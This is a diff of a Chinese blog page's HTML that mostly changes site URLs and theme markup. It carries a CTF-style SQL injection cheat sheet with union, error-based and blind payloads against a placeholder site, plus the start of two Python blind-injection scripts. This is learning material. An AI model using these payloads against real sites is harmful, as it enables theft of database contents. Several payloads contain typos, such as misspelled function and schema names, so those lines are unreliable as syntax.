@@ -1,28 +1,28 @@
 <!DOCTYPE html>
 <html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
-  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <head>
     
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
     <meta name="robots" content="noodp" />
-    <title>SQL注入小结 - Ghostasky&#39;s Blog</title><meta name="author" content="">
+    <title>SQL注入小结 - Ghostasky&#39;s Blog</title><meta name="author" content="Ghostasky">
 <meta name="author-link" content="">
-<meta name="description" content="" /><meta name="keywords" content='WEB' /><meta itemprop="name" content="SQL注入小结">
-<meta itemprop="description" content=""><meta itemprop="datePublished" content="2020-11-19T09:11:07+00:00" />
+<meta name="description" content="[TOC] 1.联合查询注入： http://xxxx.xx/?id=1&#39;http://xxxx.xx/?id=1&#39; order by 4# union前后的字段数要一致，所以要order byhttp://xxxx.xx/?id=1&#39; union 1,2,3,database()# ​ 假设当前数据库:bugku ​ user(): ​ database(): ​ table_schema:库名 ​ table_name:表名 ​ column_name:列名先介绍几个函数： 一 concat()" /><meta name="keywords" content='WEB' /><meta itemprop="name" content="SQL注入小结">
+<meta itemprop="description" content="[TOC] 1.联合查询注入： http://xxxx.xx/?id=1&#39;http://xxxx.xx/?id=1&#39; order by 4# union前后的字段数要一致，所以要order byhttp://xxxx.xx/?id=1&#39; union 1,2,3,database()# ​ 假设当前数据库:bugku ​ user(): ​ database(): ​ table_schema:库名 ​ table_name:表名 ​ column_name:列名先介绍几个函数： 一 concat()"><meta itemprop="datePublished" content="2020-11-19T09:11:07+00:00" />
 <meta itemprop="dateModified" content="2020-11-19T09:11:07+00:00" />
-<meta itemprop="wordCount" content="3539">
+<meta itemprop="wordCount" content="3508">
 <meta itemprop="keywords" content="WEB," /><meta property="og:title" content="SQL注入小结" />
-<meta property="og:description" content="" />
+<meta property="og:description" content="[TOC] 1.联合查询注入： http://xxxx.xx/?id=1&#39;http://xxxx.xx/?id=1&#39; order by 4# union前后的字段数要一致，所以要order byhttp://xxxx.xx/?id=1&#39; union 1,2,3,database()# ​ 假设当前数据库:bugku ​ user(): ​ database(): ​ table_schema:库名 ​ table_name:表名 ​ column_name:列名先介绍几个函数： 一 concat()" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="http://localhost:1313/posts/sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/" /><meta property="article:section" content="posts" />
+<meta property="og:url" content="http://ghostasky.github.io/posts/sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2020-11-19T09:11:07+00:00" />
 <meta property="article:modified_time" content="2020-11-19T09:11:07+00:00" />
 <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="SQL注入小结"/>
-<meta name="twitter:description" content=""/>
+<meta name="twitter:description" content="[TOC] 1.联合查询注入： http://xxxx.xx/?id=1&#39;http://xxxx.xx/?id=1&#39; order by 4# union前后的字段数要一致，所以要order byhttp://xxxx.xx/?id=1&#39; union 1,2,3,database()# ​ 假设当前数据库:bugku ​ user(): ​ database(): ​ table_schema:库名 ​ table_name:表名 ​ column_name:列名先介绍几个函数： 一 concat()"/>
 <meta name="application-name" content="FixIt">
 <meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
     <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://localhost:1313/posts/sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/" /><link rel="prev" href="http://localhost:1313/posts/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/" /><link rel="next" href="http://localhost:1313/posts/python__re%E6%A8%A1%E5%9D%97%E4%B8%8E%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://ghostasky.github.io/posts/sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/" /><link rel="prev" href="http://ghostasky.github.io/posts/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/" /><link rel="next" href="http://ghostasky.github.io/posts/python__re%E6%A8%A1%E5%9D%97%E4%B8%8E%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
     <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
     <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
   {
@@ -32,20 +32,20 @@
     "inLanguage": "zh-CN",
     "mainEntityOfPage": {
       "@type": "WebPage",
-      "@id": "http:\/\/localhost:1313\/posts\/sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93\/"
-    },"genre": "posts","keywords": "WEB","wordcount":  3539 ,
-    "url": "http:\/\/localhost:1313\/posts\/sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93\/","datePublished": "2020-11-19T09:11:07+00:00","dateModified": "2020-11-19T09:11:07+00:00","publisher": {
+      "@id": "http:\/\/ghostasky.github.io\/posts\/sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93\/"
+    },"genre": "posts","keywords": "WEB","wordcount":  3508 ,
+    "url": "http:\/\/ghostasky.github.io\/posts\/sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93\/","datePublished": "2020-11-19T09:11:07+00:00","dateModified": "2020-11-19T09:11:07+00:00","publisher": {
       "@type": "Organization",
       "name": ""},"author": {
         "@type": "Person",
-        "name": "作者"
+        "name": "Ghostasky"
       },"description": ""
   }
   </script></head>
-  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <body data-header-desktop="auto" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
   <div class="header-wrapper">
     <div class="header-title">
-      <a href="/" title="Ghostasky&#39;s Blog"><img loading="lazy" src="/images/fixit.png" alt="Ghostasky&#39;s Blog" data-title="Ghostasky&#39;s Blog" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-text">Ghostasky&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+      <a href="/" title="Ghostasky&#39;s Blog"><img loading="lazy" src="/images/fixit.png" alt="Ghostasky&#39;s Blog" data-title="Ghostasky&#39;s Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="typeit"><template> Ghostasky&#39;s Blog</template></span></a><span class="header-subtitle">未语之痕</span></div>
     <nav>
       <ul class="menu"><li class="menu-item">
               <a
@@ -80,7 +80,7 @@
   <div class="header-container">
     <div class="header-wrapper">
       <div class="header-title">
-        <a href="/" title="Ghostasky&#39;s Blog"><img loading="lazy" src="/images/fixit.png" alt="/images/fixit.png" data-title="/images/fixit.png" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-text">Ghostasky&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+        <a href="/" title="Ghostasky&#39;s Blog"><img loading="lazy" src="/images/fixit.png" alt="Ghostasky&#39;s Blog" data-title="Ghostasky&#39;s Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="typeit"><template> Ghostasky&#39;s Blog</template></span></a><span class="header-subtitle">未语之痕</span></div>
       <div class="menu-toggle" id="menu-toggle-mobile">
         <span></span><span></span><span></span>
       </div>
@@ -124,8 +124,7 @@
   <article class="page single">
     <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>SQL注入小结</span>
       </h1></div><div class="post-meta">
-      <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
-      Anonymous</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/technology/" class="post-category" title="分类 - Technology"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Technology</a></span></div><div class="post-meta-line"><span title="发布于 2020-11-19 09:11:07"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2020-11-19">2020-11-19</time></span>&nbsp;<span title="3539 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 3600 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 8 分钟</span>&nbsp;</div>
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/images/fixit.png" alt="Ghostasky" data-title="Ghostasky" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;Ghostasky</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/technology/" class="post-category" title="分类 - Technology"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Technology</a></span></div><div class="post-meta-line"><span title="发布于 2020-11-19 09:11:07"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2020-11-19">2020-11-19</time></span>&nbsp;<span title="3508 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 3600 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 8 分钟</span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>目录</span>
@@ -145,8 +144,11 @@
 </nav></div>
       </div><div class="content" id="content"><p>[TOC]</p>
 <hr>
-<h2 id="1联合查询注入" class="heading-element">
-  <a href="#1%e8%81%94%e5%90%88%e6%9f%a5%e8%af%a2%e6%b3%a8%e5%85%a5" class="heading-mark"></a>1.联合查询注入：</h2><pre tabindex="0"><code>http://xxxx.xx/?id=1&#39;</code></pre><pre tabindex="0"><code>http://xxxx.xx/?id=1&#39; order by 4#
+<h2 id="1联合查询注入" class="heading-element"><span>1.联合查询注入：</span>
+  <a href="#1%e8%81%94%e5%90%88%e6%9f%a5%e8%af%a2%e6%b3%a8%e5%85%a5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><pre tabindex="0"><code>http://xxxx.xx/?id=1&#39;</code></pre><pre tabindex="0"><code>http://xxxx.xx/?id=1&#39; order by 4#
 	union前后的字段数要一致，所以要order by</code></pre><pre tabindex="0"><code>http://xxxx.xx/?id=1&#39; union 1,2,3,database()#
 ​		假设当前数据库:bugku
 ​		user():
@@ -202,8 +204,11 @@ http://xxxx.xx/?id=1&#39; union select 1,2,3,group_concat(table_name) from infor
 ​		flagku.flagtable中所有的字段
 ​		假设有id，pwd</code></pre><pre tabindex="0"><code>http://xxxx.xx/?id=1&#39; union select 1,2,3,group_concat(id,&#39;-&#39;,pwd) from flagku.flagtable#
 http://xxxx.xx/?id=1&#39; union select 1,2,3,group_concat(concat_ws(&#39;~&#39;,id,pwd)) from flagku.flagtable#
-​		爆出id,pwd</code></pre><h2 id="2报错注入" class="heading-element">
-  <a href="#2%e6%8a%a5%e9%94%99%e6%b3%a8%e5%85%a5" class="heading-mark"></a>2.报错注入</h2><p>​	首先提供两个函数：
+​		爆出id,pwd</code></pre><h2 id="2报错注入" class="heading-element"><span>2.报错注入</span>
+  <a href="#2%e6%8a%a5%e9%94%99%e6%b3%a8%e5%85%a5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>​	首先提供两个函数：
 ​		extractvalue() 和 updatexml()</p>
 <pre tabindex="0"><code>http://xxxx.xx/?id=1&#39; and updataexml(1,concat(&#39;~&#39;,select schema_name from information_schema.schemata limit 0,1),1)
 ​		获取数据库名</code></pre><pre tabindex="0"><code>http://xxxx.xx/?id=1&#39; and updataexml(1,concat(&#39;~&#39;,select table_name from information_schema.tables where table_schema=&#39;flagku&#39; limit 0,1),1)
@@ -240,8 +245,11 @@ http://xxxx.xx/?id=1&#39; union select 1,2,3,group_concat(concat_ws(&#39;~&#39;,
 	admin&#39; or updatexml(1,concat(&#39;$&#39;,select group_concat(column_name) from information_schema.colunms where table_name=&#39;geekuser&#39;,1)
 		得到字段：id，pwd
 
-	admin&#39; or upatexml(1,concat(&#39;$&#39;,select concat(id,pwd)from geek.geekuser where id=1)</code></pre><h2 id="3盲注" class="heading-element">
-  <a href="#3%e7%9b%b2%e6%b3%a8" class="heading-mark"></a>3.盲注</h2><pre tabindex="0"><code>	length()：返回字符串的长度
+	admin&#39; or upatexml(1,concat(&#39;$&#39;,select concat(id,pwd)from geek.geekuser where id=1)</code></pre><h2 id="3盲注" class="heading-element"><span>3.盲注</span>
+  <a href="#3%e7%9b%b2%e6%b3%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><pre tabindex="0"><code>	length()：返回字符串的长度
 	mid(str,pos,num)  :截取指定位置指定长度的字符串
 	ascii():查询ascii码中对应的值
 	left(string, n)：得到字符串string左边n个字符
@@ -249,16 +257,22 @@ http://xxxx.xx/?id=1&#39; union select 1,2,3,group_concat(concat_ws(&#39;~&#39;,
 	substr(), substring(), mid()函数实现的功能是一样的, 均为截取字符串, 而且用法相同
 		第一个参数是想要截取的字符串，第二个参数是起始位置，第三个是要截取的长度
 	if(cs1,cs2,cs3):C语言的三目运算符cs1?cs2:cs3相同
-	count():用来统计表的行数，也就是统计记录行数</code></pre><h4 id="猜数据库名" class="heading-element">
-  <a href="#%e7%8c%9c%e6%95%b0%e6%8d%ae%e5%ba%93%e5%90%8d" class="heading-mark"></a>猜数据库名：</h4><pre tabindex="0"><code>1 &#39;and (length(database()))&gt;3#
+	count():用来统计表的行数，也就是统计记录行数</code></pre><h4 id="猜数据库名" class="heading-element"><span>猜数据库名：</span>
+  <a href="#%e7%8c%9c%e6%95%b0%e6%8d%ae%e5%ba%93%e5%90%8d" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><pre tabindex="0"><code>1 &#39;and (length(database()))&gt;3#
 		之后一直判断，假设数据库长度是4
 1&#39; and ascii(substr(database(),1,1))=119#    w
 1&#39; and ascii(substr(database(),2,1))=101#    e
 1&#39; and ascii(substr(database(),3,1))=98#    b
 1&#39; and ascii(substr(database(),4,1))=49#    1
 猜测表的个数
-	1&#39; and (select count(table_name) from infotmation_schema.tables where table_schema=databases())=2#</code></pre><h4 id="猜表名" class="heading-element">
-  <a href="#%e7%8c%9c%e8%a1%a8%e5%90%8d" class="heading-mark"></a>猜表名</h4><pre tabindex="0"><code>第一个表：
+	1&#39; and (select count(table_name) from infotmation_schema.tables where table_schema=databases())=2#</code></pre><h4 id="猜表名" class="heading-element"><span>猜表名</span>
+  <a href="#%e7%8c%9c%e8%a1%a8%e5%90%8d" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><pre tabindex="0"><code>第一个表：
 		1&#39; and length(select table_name from information_schema.tables where table_schema=database() limit 0,1)=4#
 			第一个表名长度为4
 		1&#39; and ascii(substr(select table_name from information_schema.tables where table_schema=databases() limit 0,1)1,1)=102#   f
@@ -271,21 +285,30 @@ http://xxxx.xx/?id=1&#39; union select 1,2,3,group_concat(concat_ws(&#39;~&#39;,
 	1&#39; and ascii(substr(select table_name from information_schema.tables where table_schema=databases() limit 0,1)2,1)=108#   l
 	1&#39; and ascii(substr(select table_name from information_schema.tables where table_schema=databases() limit 0,1)3,1)=97#    a
 	1&#39; and ascii(substr(select table_name from information_schema.tables where table_schema=databases() limit 0,1)4,1)=103#   g
-	1&#39; and ascii(substr(select table_name from information_schema.tables where table_schema=databases() limit 0,1)4,1)=103#   g</code></pre><h4 id="猜列名" class="heading-element">
-  <a href="#%e7%8c%9c%e5%88%97%e5%90%8d" class="heading-mark"></a>猜列名：</h4><pre tabindex="0"><code>	第一个表列名长度：
+	1&#39; and ascii(substr(select table_name from information_schema.tables where table_schema=databases() limit 0,1)4,1)=103#   g</code></pre><h4 id="猜列名" class="heading-element"><span>猜列名：</span>
+  <a href="#%e7%8c%9c%e5%88%97%e5%90%8d" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><pre tabindex="0"><code>	第一个表列名长度：
 		1&#39; and length(select column_name from information_schema.columns where table_scheme=databases() and table_name=&#39;flag&#39; limit 1)=4#
 			假设列表名长度为4
 		1&#39; and ascii(substr(select column_name from information_schema.columns where table_schema=databases() and table_name=&#39;flag&#39; limit1)1,1)=102#   f
 		1&#39; and ascii(substr(select column_name from information_schema.columns where table_schema=databases() and table_name=&#39;flag&#39; limit1)2,1)=108#   a
 		1&#39; and ascii(substr(select column_name from information_schema.columns where table_schema=databases() and table_name=&#39;flag&#39; limit1)3,1)=97#    l
-		1&#39; and ascii(substr(select column_name from information_schema.columns where table_schema=databases() and table_name=&#39;flag&#39; limit1)4,1)=103#   g</code></pre><h4 id="猜数据" class="heading-element">
-  <a href="#%e7%8c%9c%e6%95%b0%e6%8d%ae" class="heading-mark"></a>猜数据：</h4><pre tabindex="0"><code>	1&#39; and (select count(*) from flag)=1#
+		1&#39; and ascii(substr(select column_name from information_schema.columns where table_schema=databases() and table_name=&#39;flag&#39; limit1)4,1)=103#   g</code></pre><h4 id="猜数据" class="heading-element"><span>猜数据：</span>
+  <a href="#%e7%8c%9c%e6%95%b0%e6%8d%ae" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><pre tabindex="0"><code>	1&#39; and (select count(*) from flag)=1#
 		有一行数据
 	1&#39; and length(select flag from flag limit 1)=26  
 		数据长度是26
 	1&#39; and ascii(substr(select flag from flag limit 1)1,1)=102#
-		第一个字符为f，之后burp跑就oj8k.</code></pre><h2 id="下面是两个盲注的脚本来自网络" class="heading-element">
-  <a href="#%e4%b8%8b%e9%9d%a2%e6%98%af%e4%b8%a4%e4%b8%aa%e7%9b%b2%e6%b3%a8%e7%9a%84%e8%84%9a%e6%9c%ac%e6%9d%a5%e8%87%aa%e7%bd%91%e7%bb%9c" class="heading-mark"></a>下面是两个盲注的脚本(来自网络)</h2><div class="highlight" id="id-20"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">##coding=utf-8</span>
+		第一个字符为f，之后burp跑就oj8k.</code></pre><h2 id="下面是两个盲注的脚本来自网络" class="heading-element"><span>下面是两个盲注的脚本(来自网络)</span>
+  <a href="#%e4%b8%8b%e9%9d%a2%e6%98%af%e4%b8%a4%e4%b8%aa%e7%9b%b2%e6%b3%a8%e7%9a%84%e8%84%9a%e6%9c%ac%e6%9d%a5%e8%87%aa%e7%bd%91%e7%bb%9c" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">##coding=utf-8</span>
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">_username</span><span class="p">,</span><span class="n">_password</span><span class="p">):</span>
@@ -328,7 +351,7 @@ http://xxxx.xx/?id=1&#39; union select 1,2,3,group_concat(concat_ws(&#39;~&#39;,
 </span></span><span class="line"><span class="cl">                <span class="nb">print</span> <span class="n">find_name</span>
 </span></span><span class="line"><span class="cl">                <span class="k">break</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">main</span><span class="p">()</span></span></span></code></pre></div><div class="highlight" id="id-21"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">## 1.布尔盲注</span>
+</span></span><span class="line"><span class="cl"><span class="n">main</span><span class="p">()</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">## 1.布尔盲注</span>
